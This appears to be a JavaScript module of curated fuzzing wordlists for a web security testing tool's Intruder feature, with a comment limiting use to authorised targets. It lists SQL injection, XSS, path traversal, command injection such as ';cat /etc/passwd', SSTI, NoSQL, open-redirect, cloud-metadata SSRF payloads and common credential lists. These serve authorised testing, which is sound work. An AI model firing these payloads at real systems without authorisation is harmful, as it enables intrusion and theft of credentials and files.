// Built-in fuzzing lists for Intruder's "Fuzz list" payload type: short,
// curated starting points for the common injection classes — not
// exhaustive dictionaries (load a SecLists file via Simple list for that).
// Use only against applications you're authorized to test.
export const WORDLISTS = {
  sqli: {
    label: "SQL injection",
    items: [
      "'", "''", "\"", "`", "')", "'))", "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1#", "\" OR \"1\"=\"1", "1 OR 1=1", "1' AND '1'='2",
      "' UNION SELECT NULL-- ", "' UNION SELECT NULL,NULL-- ", "' UNION SELECT NULL,NULL,NULL-- ", "1 ORDER BY 1-- ", "1 ORDER BY 100-- ",
      "'; WAITFOR DELAY '0:0:5'-- ", "' AND SLEEP(5)-- ", "1) AND SLEEP(5)-- ", "'||pg_sleep(5)-- ", "' AND 1=CONVERT(int,@@version)-- ",
      "admin'-- ", "1;SELECT 1", "%27", "%2527",
    ],
  },
  xss: {
    label: "Cross-site scripting (XSS)",
    items: [
      "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
      "<img src=x onerror=alert(document.domain)>", "javascript:alert(1)", "\"onmouseover=\"alert(1)", "'-alert(1)-'", "\\'-alert(1)//",
      "</script><script>alert(1)</script>", "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>", "{{constructor.constructor('alert(1)')()}}",
      "<a href=\"javascript:alert(1)\">x</a>", "%3Cscript%3Ealert(1)%3C/script%3E", "&lt;script&gt;alert(1)&lt;/script&gt;", "zp<\"'>zp",
    ],
  },
  pathTraversal: {
    label: "Path traversal / LFI",
    items: [
      "../../../../etc/passwd", "../../../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "/etc/passwd%00", "../../../../etc/passwd%00.png",
      "..\\..\\..\\..\\windows\\win.ini", "C:\\Windows\\win.ini", "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ",
    ],
  },
  commandInjection: {
    label: "OS command injection",
    items: [
      ";id", "|id", "||id", "&&id", "&id", "`id`", "$(id)", ";sleep 5", "|sleep 5", "$(sleep 5)", "`sleep 5`", "& ping -n 5 127.0.0.1 &",
      "%0aid", "\nid", ";cat /etc/passwd", "| type C:\\Windows\\win.ini",
    ],
  },
  ssti: {
    label: "Template injection (SSTI)",
    items: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "${{7*7}}", "@(7*7)", "{7*7}", "[[7*7]]", "*{7*7}", "{{config}}", "{{self}}", "${T(java.lang.System).getenv()}"],
  },
  nosqli: {
    label: "NoSQL injection",
    items: ["{\"$ne\": null}", "{\"$gt\": \"\"}", "{\"$regex\": \".*\"}", "[$ne]=1", "' || '1'=='1", "'; return true; var x='", "{\"$where\": \"sleep(5000)\"}", "true, $where: '1 == 1'"],
  },
  openRedirect: {
    label: "Open redirect",
    items: ["https://evil.example", "//evil.example", "///evil.example", "/\\evil.example", "https:evil.example", "//evil.example%2f%2e%2e", "https://evil.example@trusted.example", "javascript:alert(1)", "%2f%2fevil.example"],
  },
  ssrf: {
    label: "SSRF targets",
    items: [
      "http://127.0.0.1/", "http://localhost/", "http://[::1]/", "http://0.0.0.0/", "http://2130706433/", "http://0x7f000001/", "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    ],
  },
  boundaryNumbers: {
    label: "Boundary numbers",
    items: ["0", "-1", "1", "-0", "00", "0.0", "1e9", "1e309", "-1e309", "NaN", "Infinity", "127", "128", "255", "256", "32767", "32768", "65535", "65536", "2147483647", "2147483648", "-2147483648", "-2147483649", "4294967295", "4294967296", "9007199254740991", "9007199254740993", "9223372036854775807", "9223372036854775808"],
  },
  specialChars: {
    label: "Special characters",
    items: ["'", "\"", "`", "<", ">", "&", ";", "|", "\\", "/", "%", "%00", "%0a", "%0d%0a", "{", "}", "[", "]", "(", ")", "$", "#", "*", "?", "~", "^", "\u0000", "\u202e", "😀", " ", "\t"],
  },
  directories: {
    label: "Common paths",
    items: [
      "admin", "administrator", "login", "dashboard", "api", "api/v1", "api/v2", "graphql", "swagger", "swagger.json", "openapi.json", "api-docs", ".git/HEAD", ".env",
      "config", "backup", "backup.zip", "debug", "console", "actuator", "actuator/env", "server-status", "phpinfo.php", "robots.txt", "sitemap.xml", ".well-known/security.txt", "test", "uploads", "wp-admin",
    ],
  },
  usernames: {
    label: "Common usernames",
    items: ["admin", "administrator", "root", "test", "user", "guest", "demo", "support", "info", "sysadmin", "webmaster", "operator", "dev", "developer", "service", "api"],
  },
  passwords: {
    label: "Common passwords (top 30)",
    items: [
      "123456", "password", "123456789", "12345678", "12345", "qwerty", "abc123", "password1", "111111", "123123", "admin", "letmein", "welcome", "monkey",
      "1234567890", "1234", "iloveyou", "Password1", "qwerty123", "000000", "dragon", "sunshine", "princess", "football", "admin123", "changeme", "root", "toor", "test", "secret",
    ],
  },
  httpMethods: {
    label: "HTTP methods",
    items: ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "MOVE", "COPY", "DEBUG", "FOO"],
  },
};

export const WORDLIST_IDS = Object.keys(WORDLISTS);
